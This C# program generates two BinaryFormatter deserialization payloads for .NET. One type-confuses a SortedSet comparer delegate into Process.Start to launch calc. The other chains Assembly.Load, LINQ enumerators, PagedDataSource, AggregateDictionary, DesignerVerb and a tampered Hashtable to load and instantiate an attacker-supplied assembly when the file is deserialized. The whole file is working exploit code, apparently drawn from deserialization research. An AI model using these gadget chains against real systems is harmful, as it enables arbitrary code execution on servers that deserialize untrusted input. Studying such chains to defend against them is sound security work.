using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.UI.WebControls;
using ExploitAssembly;

namespace VulnerableDeserialization
    {
    class Program
        {
        private static void TypeConfuseDelegate (Comparison<string> comp)
            {
            FieldInfo fi = typeof(MulticastDelegate).GetField ("_invocationList",
                                                               BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invokeList = comp.GetInvocationList ();
            // Modify the invocation list to add Process::Start(string, string)
            invokeList[1] = new Func<string, string, Process> (Process.Start);
            fi.SetValue (comp, invokeList);
            }

        private static void MakePayload1 (string fileName)
            {
// Create a simple multicast delegate.
            Delegate d = new Comparison<string> (String.Compare);
            Comparison<string> cd = (Comparison<string>)MulticastDelegate.Combine (d, d);
// Create set with original comparer.
            IComparer<string> comp = Comparer<string>.Create (cd);
            SortedSet<string> set = new SortedSet<string> (comp);

// Setup values to call calc.exe with a dummy argument.
            set.Add ("calc");
            set.Add ("adummy");

            TypeConfuseDelegate (cd);

            using (var fs = new FileStream ($@"c:\temp\{fileName}", FileMode.Create))
                {
                var formatter = new BinaryFormatter ();
                formatter.Serialize (fs, set);
                }
            }

        private static void MakePayload2 (string fileName)
            {
            // Build a chain to map a byte array to creating an instance of a class.
            // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
            List<byte[]> data = new List<byte[]>();
            data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location));
            var e1 = data.Select(Assembly.Load);
            Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
            var e2 = e1.SelectMany(map_type);
            var e3 = e2.Select(Activator.CreateInstance);

            // PagedDataSource maps an arbitrary IEnumerable to an ICollection
            PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
            // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
            // Class is internal so need to use reflection.
            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

            // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
            DesignerVerb verb = new DesignerVerb("XYZ", null);
            // Need to insert IDictionary using reflection.
            typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

            // Pre-load objects, this ensures they're fixed up before building the hash table.
            List<object> ls = new List<object>();
            ls.Add(e1);
            ls.Add(e2);
            ls.Add(e3);
            ls.Add(pds);
            ls.Add(verb);
            ls.Add(dict);

            Hashtable ht = new Hashtable();

            // Add two entries to table.
            ht.Add(verb, "Hello");
            ht.Add("Dummy", "Hello2");

            FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
            Array keys = (Array)fi_keys.GetValue(ht);
            FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
            for (int i = 0; i < keys.Length; ++i)
                {
                object bucket = keys.GetValue(i);
                object key = fi_key.GetValue(bucket);
                if (key is string)
                    {
                    fi_key.SetValue(bucket, verb);
                    keys.SetValue(bucket, i);
                    break;
                    }
                }

            fi_keys.SetValue(ht, keys);

            ls.Add(ht);

            using (var fs = new FileStream ($@"c:\temp\{fileName}", FileMode.Create))
                {
                var formatter = new BinaryFormatter ();
                formatter.SurrogateSelector = new MySurrogateSelector();

                formatter.Serialize (fs, ls);
                }
            }

        class MySurrogateSelector : SurrogateSelector
            {
            public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
                {
                selector = this;
                if (!type.IsSerializable)
                    {
                    Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                    return (ISerializationSurrogate)Activator.CreateInstance(t);
                    }

                return base.GetSurrogate(type, context, out selector);
                }

            }

        private static void Main (string[] args)
            {
            MakePayload1 ("serialized.dat");
            MakePayload2 ("serialized2.dat");
            }
        }
    }
